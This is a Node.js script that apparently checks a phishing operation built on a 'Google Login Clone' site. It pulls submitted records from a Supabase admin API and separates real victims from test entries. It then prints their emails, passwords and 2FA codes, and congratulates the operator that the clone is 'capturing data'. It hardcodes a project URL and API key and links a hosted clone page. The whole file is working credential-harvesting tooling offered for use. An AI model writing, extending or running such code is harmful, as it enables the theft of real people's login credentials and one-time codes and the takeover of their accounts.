// VERIFY USER TEST RESULTS
console.log('🔍 USER TEST VERIFICATION');
console.log('Run this AFTER you test the website');
console.log('==========================================\n');

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY,
    'Content-Type': 'application/json'
};

async function verifyUserTest() {
    try {
        console.log('📊 Checking for your test data...\n');
        
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, { headers });
        const data = await response.json();
        
        console.log('✅ CURRENT STATUS:');
        console.log('==========================================');
        console.log('📊 Total Requests:', data.length);
        
        // Identify real user data (non-test emails)
        const realUserData = data.filter(req => 
            !req.email.includes('test') && 
            !req.email.includes('example.com') &&
            !req.email.includes('integration') &&
            !req.email.includes('frontend') &&
            !req.email.includes('live.website') &&
            !req.email.includes('fixed.url') &&
            !req.email.includes('user.url')
        );
        
        console.log('🌐 REAL USER SUBMISSIONS:', realUserData.length);
        
        if (realUserData.length > 0) {
            console.log('🎉 SUCCESS! Website is working!');
            console.log('');
            console.log('📧 YOUR SUBMISSIONS:');
            realUserData.slice(0, 5).forEach((req, index) => {
                console.log(`${index + 1}. ${req.email}`);
                console.log(`   📄 Page: ${req.pageStatus}`);
                console.log(`   🕐 Time: ${new Date(req.createdAt).toLocaleString()}`);
                if (req.password && req.password !== 'undefined') {
                    console.log(`   🔐 Password: ${req.password}`);
                }
                if (req.twofa && req.twofa !== 'undefined') {
                    console.log(`   📱 2FA: ${req.twofa}`);
                }
                console.log('');
            });
        } else {
            console.log('⚠️ No real user data found');
            console.log('💡 Possible reasons:');
            console.log('   - Website still has old code');
            console.log('   - Browser cache not cleared');
            console.log('   - User tested wrong URL');
            console.log('');
            console.log('🔧 SOLUTIONS:');
            console.log('1. 🌐 Use working URL: https://google-login-clone-demo.netlify.app');
            console.log('2. 🔄 Clear cache (Ctrl+Shift+R) and try again');
            console.log('3. 🛠️ Check browser DevTools for errors');
        }
        
        console.log('');
        console.log('🕒 LATEST 5 REQUESTS:');
        console.log('==========================================');
        
        data.slice(0, 5).forEach((req, index) => {
            const isTest = req.email.includes('test') || req.email.includes('example.com') || 
                          req.email.includes('integration') || req.email.includes('frontend') ||
                          req.email.includes('live.website') || req.email.includes('fixed.url') ||
                          req.email.includes('user.url');
            const icon = isTest ? '🧪' : '🌐';
            console.log(`${icon} ${req.email} | ${req.pageStatus} | ${new Date(req.createdAt).toLocaleString()}`);
        });
        
        console.log('\n==========================================');
        console.log('📋 SYSTEM STATUS:');
        console.log('==========================================');
        console.log('✅ Supabase Backend: WORKING');
        console.log('✅ Admin GUI: WORKING');
        console.log('✅ Database: WORKING');
        
        if (realUserData.length > 0) {
            console.log('✅ Frontend: WORKING ✨');
            console.log('');
            console.log('🏆 CONGRATULATIONS!');
            console.log('🎯 Your Google Login Clone is LIVE and capturing data!');
            console.log('📱 All user inputs are saved in real-time');
            console.log('🛡️ Admin can manage requests via GUI Local/gui.html');
        } else {
            console.log('⏳ Frontend: Needs fixing');
            console.log('');
            console.log('🎯 RECOMMENDED ACTION:');
            console.log('Use this working URL: https://google-login-clone-demo.netlify.app');
            console.log('Then run this script again to verify.');
        }
        
        console.log('==========================================');
        
    } catch (error) {
        console.log('❌ Error during verification:', error.message);
    }
}

verifyUserTest(); 